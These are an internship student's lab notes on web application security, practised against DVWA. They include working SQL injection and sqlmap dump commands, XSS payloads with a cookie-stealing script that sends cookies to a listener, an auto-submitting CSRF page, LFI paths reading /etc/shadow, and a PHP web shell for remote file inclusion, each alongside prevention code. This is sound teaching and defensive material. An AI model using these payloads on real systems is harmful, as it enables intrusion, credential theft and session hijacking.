# Task 3: Web Application Security
> ApexPlanet Cybersecurity Internship | Days 25–36

---

## 1. SQL Injection (SQLi)

### What is SQL Injection?
SQL Injection is a web security vulnerability that allows an attacker to interfere with the queries an application makes to its database. It can allow attackers to view, modify, or delete data they are not normally able to access.

### Types of SQL Injection
| Type | Description |
|------|-------------|
| **In-band SQLi** | Uses same channel to attack and retrieve data |
| **Error-based** | Extracts data through database error messages |
| **Union-based** | Uses UNION operator to retrieve data from other tables |
| **Blind SQLi** | No visible output — inferred from app behavior |
| **Boolean-based** | Sends queries that return true/false responses |
| **Time-based** | Uses time delays to infer true/false |
| **Out-of-band** | Uses different channel (DNS/HTTP) to retrieve data |

### SQLi in DVWA (Security: Low)
```sql
-- Basic test (if vulnerable, returns all users)
1' OR '1'='1
1' OR 1=1--
' OR 1=1#

-- Get database name
1' UNION SELECT null, database()--

-- Get all databases
1' UNION SELECT null, schema_name FROM information_schema.schemata--

-- Get tables in current database
1' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database()--

-- Get columns from users table
1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users'--

-- Dump credentials
1' UNION SELECT user, password FROM users--
```

### SQLi with sqlmap (Automated)
```bash
# Basic scan
sqlmap -u "http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx;security=low"

# Dump database
sqlmap -u "http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx;security=low" --dbs

# Dump tables
sqlmap -u "URL" --cookie="..." -D dvwa --tables

# Dump users
sqlmap -u "URL" --cookie="..." -D dvwa -T users --dump
```

### Prevention — Prepared Statements
```php
// VULNERABLE CODE
$id = $_GET['id'];
$query = "SELECT * FROM users WHERE id = '$id'";
$result = mysqli_query($conn, $query);

// SECURE CODE — Prepared Statement
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);
$result = $stmt->fetchAll();

// Also: Input validation
$id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);
```

---

## 2. Cross-Site Scripting (XSS)

### What is XSS?
XSS allows attackers to inject malicious scripts into web pages viewed by other users. The browser executes the script thinking it came from a trusted source.

### Types of XSS
| Type | Description | Persistence |
|------|-------------|-------------|
| **Reflected** | Script in URL, executed immediately | No |
| **Stored** | Script saved in database, executes for all visitors | Yes |
| **DOM-based** | Modifies DOM in browser without server involvement | No |

### Reflected XSS in DVWA
```javascript
// Basic alert
<script>alert('XSS')</script>

// Cookie stealing
<script>alert(document.cookie)</script>

// Redirect
<script>window.location='http://attacker.com'</script>

// Image onerror bypass
<img src=x onerror=alert('XSS')>

// SVG bypass
<svg onload=alert('XSS')>

// No script tag
<body onload=alert('XSS')>
```

### Stored XSS in DVWA
```javascript
// In the message/name field (persists in DB):
<script>alert('Stored XSS')</script>

// Cookie harvester
<script>document.location='http://192.168.56.100:8000/?c='+document.cookie</script>

// Set up listener on Kali:
python3 -m http.server 8000
// Then check logs for stolen cookies
```

### Prevention
```html
<!-- 1. Content Security Policy Header -->
Content-Security-Policy: default-src 'self'; script-src 'self'

<!-- 2. Input validation + output encoding -->
<!-- Never trust user input -->
<!-- Encode: < → &lt;  > → &gt;  " → &quot; -->

<!-- 3. HttpOnly cookie flag -->
Set-Cookie: session=abc123; HttpOnly; Secure
```

---

## 3. Cross-Site Request Forgery (CSRF)

### What is CSRF?
CSRF tricks an authenticated user into unknowingly submitting a malicious request. The attack exploits the browser's automatic inclusion of cookies with requests.

### CSRF Attack Flow
```
1. Victim logs into bank/DVWA (gets session cookie)
2. Victim visits attacker's malicious page
3. Malicious page sends request to bank/DVWA using victim's cookie
4. Server processes request thinking it's legitimate
```

### CSRF Demo Page for DVWA
```html
<!-- Save as csrf-demo.html, open in browser while logged into DVWA -->
<html>
<head><title>CSRF Demo</title></head>
<body>
  <h1>You've won a prize! Click below to claim.</h1>
  
  <!-- Hidden form that auto-submits -->
  <form id="csrfForm" 
        action="http://192.168.56.101/dvwa/vulnerabilities/csrf/" 
        method="GET">
    <input type="hidden" name="password_new" value="hacked123"/>
    <input type="hidden" name="password_conf" value="hacked123"/>
    <input type="hidden" name="Change" value="Change"/>
  </form>
  
  <script>
    // Auto-submit on page load
    document.getElementById('csrfForm').submit();
  </script>
</body>
</html>
```

### Prevention
```php
// 1. CSRF Token (server generates unique token per session)
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));

// Add to form:
<input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token'] ?>">

// Validate on submission:
if($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die("CSRF attack detected!");
}

// 2. SameSite Cookie Attribute
Set-Cookie: session=abc; SameSite=Strict; Secure; HttpOnly

// 3. Check Referer Header
if($_SERVER['HTTP_REFERER'] !== 'https://trusted-site.com') {
    die("Invalid request origin");
}
```

---

## 4. File Inclusion Attacks

### What is File Inclusion?
File inclusion vulnerabilities occur when an application uses user-supplied input to include files without proper validation.

### Local File Inclusion (LFI)
```
# Read system files via DVWA URL:
http://192.168.56.101/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd
http://192.168.56.101/dvwa/vulnerabilities/fi/?page=../../../../etc/shadow
http://192.168.56.101/dvwa/vulnerabilities/fi/?page=../../../../etc/hosts
http://192.168.56.101/dvwa/vulnerabilities/fi/?page=../../../../var/log/apache2/access.log

# Windows targets:
?page=../../../../windows/system32/drivers/etc/hosts
?page=../../../../boot.ini

# PHP wrappers:
?page=php://filter/convert.base64-encode/resource=index.php
?page=php://input (POST malicious PHP code)
```

### Remote File Inclusion (RFI)
```bash
# Step 1: Create malicious PHP shell on Kali
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php

# Step 2: Host it with Python
cd /tmp
python3 -m http.server 8000

# Step 3: Include via DVWA URL
# http://192.168.56.101/dvwa/vulnerabilities/fi/?page=http://192.168.56.100:8000/shell.php&cmd=id
# http://...&cmd=whoami
# http://...&cmd=cat+/etc/passwd
```

### Prevention
```php
// VULNERABLE
$page = $_GET['page'];
include($page);

// SECURE — Whitelist approach
$allowed = ['home', 'about', 'contact'];
$page = $_GET['page'];
if (in_array($page, $allowed)) {
    include($page . '.php');
} else {
    include('home.php');
}

// Also: disable allow_url_include in php.ini
allow_url_include = Off
allow_url_fopen = Off
```

---

## 5. Burp Suite Advanced

### Setup
```
1. Open Burp Suite Community Edition
2. Proxy → Options → Add listener: 127.0.0.1:8080
3. Firefox → Settings → Network Settings → Manual proxy
   HTTP Proxy: 127.0.0.1  Port: 8080
   Check: Also use for HTTPS
4. Download Burp CA cert: http://burp
5. Import cert in Firefox → Settings → Certificates
```

### Intercepting Requests
```
1. Proxy → Intercept → Turn ON
2. Browse to DVWA login page
3. Enter credentials → Submit
4. Request appears in Burp
5. Inspect: username, password parameters
6. Modify values → Forward
7. Turn Intercept OFF when done
```

### Repeater
```
1. Intercept a request
2. Right-click → Send to Repeater
3. Repeater tab → modify parameters
4. Click Send → see response on right
5. Try different payloads manually
```

### Intruder (Fuzzing)
```
1. Intercept login request → Send to Intruder
2. Intruder → Positions tab
3. Clear § markers → highlight password value → Add §
4. Attack Type: Sniper
5. Payloads tab → Simple List
6. Load: /usr/share/wordlists/rockyou.txt
   (gunzip first: gunzip /usr/share/wordlists/rockyou.txt.gz)
7. Start Attack
8. Sort by Length → different length = valid password
```

### Decoder
```
Burp Decoder Tab:
- Paste encoded text
- Decode as: Base64, URL, HTML, Hex
- Encode as: same options
Useful for: JWT tokens, Base64 cookies, URL-encoded params
```

---

## 6. Web Security Headers

### Checking Headers
```bash
# Check response headers
curl -I http://192.168.56.101
curl -I https://google.com

# Online tool: https://securityheaders.com
```

### Important Security Headers
| Header | Purpose | Example Value |
|--------|---------|---------------|
| **X-Frame-Options** | Prevent clickjacking | `DENY` or `SAMEORIGIN` |
| **X-XSS-Protection** | Browser XSS filter | `1; mode=block` |
| **X-Content-Type-Options** | Prevent MIME sniffing | `nosniff` |
| **Content-Security-Policy** | Control resource loading | `default-src 'self'` |
| **Strict-Transport-Security** | Force HTTPS | `max-age=31536000` |
| **Referrer-Policy** | Control referrer info | `no-referrer` |
| **Permissions-Policy** | Control browser features | `geolocation=()` |

### Adding Headers to Apache
```bash
# Enable headers module
a2enmod headers
systemctl restart apache2

# Edit config
nano /etc/apache2/apache2.conf

# Add these lines:
Header always set X-Frame-Options "DENY"
Header always set X-XSS-Protection "1; mode=block"
Header always set X-Content-Type-Options "nosniff"
Header always set Content-Security-Policy "default-src 'self'"
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
Header always set Referrer-Policy "no-referrer"

# Restart Apache
systemctl restart apache2

# Verify
curl -I http://localhost
```

---

## OWASP Top 10 (2021) Overview

| Rank | Vulnerability | Covered in Task 3 |
|------|--------------|------------------|
| A01 | Broken Access Control | Partially |
| A02 | Cryptographic Failures | Headers (HSTS) |
| A03 | Injection | ✅ SQL Injection |
| A04 | Insecure Design | — |
| A05 | Security Misconfiguration | ✅ Security Headers |
| A06 | Vulnerable Components | — |
| A07 | Auth & Session Failures | ✅ CSRF |
| A08 | Software & Data Integrity | — |
| A09 | Logging & Monitoring | — |
| A10 | SSRF | ✅ RFI (similar concept) |

---

## Key Concepts Summary

| Concept | One-liner |
|---------|-----------|
| **SQL Injection** | Manipulating DB queries through user input |
| **XSS** | Injecting JavaScript into pages viewed by others |
| **CSRF** | Tricking browser into making unauthorized requests |
| **LFI** | Reading local server files via URL parameter |
| **RFI** | Including and executing remote malicious files |
| **Prepared Statement** | Parameterized query that prevents SQLi |
| **CSP** | HTTP header controlling which scripts can run |
| **CSRF Token** | Unique token validating form request origin |
| **Burp Suite** | Web proxy for intercepting and modifying HTTP |
| **DVWA** | Deliberately vulnerable web app for practice |
| **OWASP** | Organization maintaining web security standards |
| **WAF** | Web Application Firewall — filters malicious requests |

---

*Notes by Manivel R | ApexPlanet Cybersecurity Internship 2026*
